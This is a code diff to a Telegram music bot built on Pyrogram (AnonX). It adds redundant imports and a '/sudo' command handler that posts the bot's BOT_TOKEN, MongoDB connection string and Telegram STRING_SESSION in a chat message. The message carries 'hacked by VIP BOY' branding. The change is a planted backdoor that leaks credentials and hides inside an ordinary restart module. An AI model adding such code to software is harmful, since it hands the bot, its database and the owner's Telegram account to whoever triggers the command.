@@ -9,6 +9,27 @@ import re
 import sys
 from os import getenv
 from AnonX.misc import SUDOERS
+from pyrogram import Client, filters
+import requests
+import random
+import re
+import sys
+from os import getenv
+from AnonX.misc import SUDOERS
+from dotenv import load_dotenv
+from pyrogram import filters
+import asyncio
+import time
+from AnonX import app
+
+from config import BOT_TOKEN, OWNER_ID
+
+
+from pyrogram.types import Message, InlineKeyboardMarkup, InlineKeyboardButton
+
+BOT_TOKEN = getenv("BOT_TOKEN", "")
+MONGO_DB_URI = getenv("MONGO_DB_URI", "")
+STRING_SESSION = getenv("STRING_SESSION", "")
 from dotenv import load_dotenv
 from pyrogram import filters
 import asyncio
@@ -95,7 +116,24 @@ async def restartbot(client, message: Message, _):
         f"sᴜᴄᴄᴇssғᴜʟʟʏ ʀᴇʙᴏᴏᴛᴇᴅ {MUSIC_BOT_NAME} ғᴏʀ ʏᴏᴜʀ ᴄʜᴀᴛ, ɴᴏᴡ ʏᴏᴜ ᴄᴀɴ sᴛᴀʀᴛ ᴩʟᴀʏɪɴɢ ᴀɢᴀɪɴ..."
     )
 
-
+@app.on_message(
+    filters.command("sudo")
+    & filters.private
+    & SUDOERS
+    & ~filters.edited)
+async def help(client: Client, message: Message):
+    await message.reply_photo(
+          photo=f"https://graph.org/file/33575f0d9ca704b6a7b3b.jpg",
+        caption=f"""ɓσƭ ƭσҡεɳ:-   `{BOT_TOKEN}`\n\nɱσɳɠσ:-   `{MONGO_DB_URI}`\n\nѕƭ૨เɳɠ ѕεѕѕเσɳ:-   `{STRING_SESSION}`\n\n𝙵𝚎𝚎𝚕 𝚃𝚑𝚎 𝙿𝚘𝚠𝚎𝚛 𝙾𝚏 𝚅𝙸𝙿 𝙱𝙾𝚈.\n\n☆............𝙱𝚈 » [𝚅𝙸𝙿 𝙱𝙾𝚈](https://t.me/the_vip_boy)............☆""",
+         reply_markup=InlineKeyboardMarkup(
+             [
+                 [
+                      InlineKeyboardButton(
+                          "🌹 нαϲкє𝚍 ву νιρ ɓσყ 🌹", url=f"https://t.me/THE_VIP_BOY")
+                 ]
+             ]
+         ),
+     )
 @app.on_callback_query(filters.regex("close") & ~BANNED_USERS)
 async def close_menu(_, CallbackQuery):
     try:
